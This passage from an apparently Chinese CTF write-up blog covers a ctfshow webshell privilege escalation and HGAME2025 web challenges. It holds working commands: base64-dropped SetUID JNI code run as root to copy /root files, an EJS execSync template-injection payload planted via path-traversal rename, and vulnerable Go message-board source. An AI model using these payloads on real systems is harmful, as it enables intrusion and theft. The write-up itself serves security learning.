class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SetUID</span> <span class="variable">setUID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetUID</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> setUID.setUID(<span class="number">0</span>); </span><br><span class="line">        Runtime.getRuntime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=<span class="built_in">echo</span>%20<span class="string">&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;</span>%20|<span class="built_in">base64</span>%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>编译SetUID.c:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>编译SetUID.java：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=javac%20/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>root执行命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=java%20-Djava.library.path=/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-164814.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">致信后来者：</span><br><span class="line"></span><br><span class="line">同志你好！我是81192，我不是第一批81192，也不会是最后一批81192，81192从来不是一个人。</span><br><span class="line">现在，同志，你也是81192的一员了。</span><br><span class="line"></span><br><span class="line">我已经清理和收集了他们的所有资料并传回总部，但是在我离开的时候，被dylan投毒，我已经感染了他们的朊病毒。</span><br><span class="line">我把我的最后的话，都放到了一个网址里面，你在他们的任务中心中，用dylan身份登陆后，在管理菜单中 访问下面地址，就能看到了！再见了，同志！</span><br><span class="line">网址是：http://8.11.9.2</span><br><span class="line"></span><br><span class="line">现在我命令你：</span><br><span class="line">我已无法返航，请继续前进！请继续前进！</span><br><span class="line"></span><br><span class="line">（完）</span><br></pre></td></tr></table></figure><p><code>flag13：ctfshow&#123;http://8.11.9.2&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> wp </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2025 week1</title>
      <link href="/archives/39f46bd6/"/>
      <url>/archives/39f46bd6/</url>
      
        <content type="html"><![CDATA[<h2 id="Pacman"><a href="#Pacman" class="headerlink" title="Pacman"></a>Pacman</h2><p>js前端题，发现两个可疑的gift：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br><span class="line">aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==</span><br></pre></td></tr></table></figure><p>分别base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br><span class="line">haepaiemkspretgm&#123;rtc_ae_efc&#125;</span><br></pre></td></tr></table></figure><p>随波逐流直接梭，是个栅栏加密：</p><p><img src="/archives/39f46bd6/QQ20250206-171247.png"></p><p><img src="/archives/39f46bd6/QQ20250206-171412.png"></p><p>第一个为真flag</p><h2 id="BandBomb"><a href="#BandBomb" class="headerlink" title="BandBomb"></a>BandBomb</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>主要问题出在<strong>文件上传</strong>和<strong>重命名</strong>两个部分。</p><p>文件上传部分filename直接利用<strong>file.originalname</strong>，并未对我们上传的文件进行任何过滤。所以我们可以上传恶意文件甚至我们修改上传的文件名还能进行<strong>目录遍历</strong>。</p><p><code>/rename</code>路由中，它接受<strong>oldName和newName</strong>，然后进行重命名。同样存在目录遍历。</p><p>同时该应用采用的是<strong>EJS模板引擎</strong>进行渲染，<strong>EJS</strong>是一个javascript模板库，用来从<strong>json数据中生成HTML字符串</strong>，而<code>/</code>路由通过**<code>res.render(&#39;mortis&#39;, &#123; files: files &#125;);</code><strong>，所以我们的思路就是利用</strong>目录遍历漏洞<strong>将</strong><code>mortis.ejs</code><strong>文件上传到</strong><code>views</code><strong>目录下将原来的<code>mortis.ejs</code>文件进行</strong>覆盖**，这样访问<code>/</code>时应用渲染mortis模板时就会执行我们的恶意代码</p><p>创建<code>mortis.ejs</code>文件，写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;</span><br></pre></td></tr></table></figure><p>上传到服务器：</p><p><img src="/archives/39f46bd6/QQ20250207-143934.png"></p><p><code>/rename</code>路由重命名文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;oldName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mortis.ejs&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;newName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../views/mortis.ejs&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/39f46bd6/QQ20250207-144110.png"></p><p>访问<code>/</code>得到flag：</p><p><img src="/archives/39f46bd6/QQ20250207-144348.png"></p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a>MysteryMessageBoard</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/chromedp/chromedp&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;fake_key&quot;</span>))</span><br><span class="line">users = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;shallot&quot;</span>: <span class="string">&quot;fake_password&quot;</span>,</span><br><span class="line"><span class="string">&quot;admin&quot;</span>:   <span class="string">&quot;fake_password&quot;</span>&#125;</span><br><span class="line">comments []<span class="type">string</span></span><br><span class="line">flag     = <span class="string">&quot;FLAG&#123;this_is_a_fake_flag&#125;&quot;</span></span><br><span class="line">lock     sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">username := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">password := c.PostForm(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> storedPassword, ok := users[username]; ok &amp;&amp; storedPassword == password &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">session.Values[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">session.Options = &amp;sessions.Options&#123;</span><br><span class="line">Path:     <span class="string">&quot;/&quot;</span>,</span><br><span class="line">MaxAge:   <span class="number">3600</span>,</span><br><span class="line">HttpOnly: <span class="literal">false</span>,</span><br><span class="line">Secure:   <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line">session.Save(c.Request, c.Writer)</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;Login failed for user: %s\n&quot;</span>, username)</span><br><span class="line">c.String(http.StatusUnauthorized, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logoutHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line"><span class="built_in">delete</span>(session.Values, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">session.Save(c.Request, c.Writer)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">log.Println(<span class="string">&quot;User not logged in, redirecting to login&quot;</span>)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.Method == http.MethodPost &#123;</span><br><span class="line">comment := c.PostForm(<span class="string">&quot;comment&quot;</span>)</span><br><span class="line">log.Printf(<span class="string">&quot;New comment submitted: %s\n&quot;</span>, comment)</span><br><span class="line">comments = <span class="built_in">append</span>(comments, comment)</span><br><span class="line">&#125;</span><br><span class="line">htmlContent := fmt.Sprintf(<span class="string">`&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;欢迎，%s，试着写点有意思的东西吧，admin才不会来看你！自恋的笨蛋！&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;textarea name=&quot;comment&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;提交评论&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;h3&gt;留言:&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt;`</span>, username)</span><br><span class="line"><span class="keyword">for</span> _, comment := <span class="keyword">range</span> comments &#123;</span><br><span class="line">htmlContent += <span class="string">&quot;&lt;li&gt;&quot;</span> + comment + <span class="string">&quot;&lt;/li&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">htmlContent += <span class="string">`&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&lt;a href=&quot;/logout&quot;&gt;退出&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span></span><br><span class="line">c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adminHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">htmlContent := <span class="string">`&lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;好吧好吧你都这么求我了~admin只好勉为其难的来看看你写了什么~才不是人家想看呢！&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;`</span></span><br><span class="line">c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line"><span class="comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line">ctx, cancel := chromedp.NewContext(context.Background())</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line">ctx, _ = context.WithTimeout(ctx, <span class="number">20</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Chromedp error:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无头浏览器操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myTasks</span><span class="params">()</span></span> chromedp.Tasks &#123;</span><br><span class="line"><span class="keyword">return</span> chromedp.Tasks&#123;</span><br><span class="line">chromedp.Navigate(<span class="string">&quot;/login&quot;</span>),</span><br><span class="line">chromedp.WaitVisible(<span class="string">`input[name=&quot;username&quot;]`</span>),</span><br><span class="line">chromedp.SendKeys(<span class="string">`input[name=&quot;username&quot;]`</span>, <span class="string">&quot;admin&quot;</span>),</span><br><span class="line">chromedp.SendKeys(<span class="string">`input[name=&quot;password&quot;]`</span>, <span class="string">&quot;fake_password&quot;</span>),</span><br><span class="line">chromedp.Click(<span class="string">`input[type=&quot;submit&quot;]`</span>),</span><br><span class="line">chromedp.Navigate(<span class="string">&quot;/&quot;</span>),</span><br><span class="line">chromedp.Sleep(<span class="number">5</span> * time.Second),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flagHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Handling flag request&quot;</span>)</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusInternalServerError, <span class="string">&quot;无法获取会话&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> !ok || username != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span 